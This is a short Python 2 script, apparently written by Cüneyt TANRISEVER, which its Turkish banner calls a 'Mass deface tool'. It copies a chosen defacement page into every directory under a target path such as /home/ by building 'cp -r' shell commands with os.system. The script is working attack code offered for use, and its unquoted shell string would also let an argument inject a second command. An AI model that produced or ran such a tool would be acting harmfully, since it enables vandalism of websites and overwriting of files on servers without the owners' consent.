import os
import sys
print  """
##############################################################################################################################
#                        Cüneyt TANRISEVER                                                                                   #
#                        Mass deface tool                                                                                    #
#  kullanimi= dexmass.py indexsiniz ve dizin girin (belirtilen dizinin altindaki tum dosyalara basar)  yeni dosya adi        #
#  dexmass.py index.html /home/ defacedex.html                                                                               #
#     ------ indexsiniz--dizin---dizinlere kopyalanacak index adi-------                                                     #
##############################################################################################################################"""


index=sys.argv[1]
dizin=sys.argv[2]
yeni=sys.argv[3]
for i in os.walk(dizin):
    c= i[0]
    kk="cp -r %s %s/%s"%(index,c,yeni)
    os.system(kk)
print "islem tamamdir..."
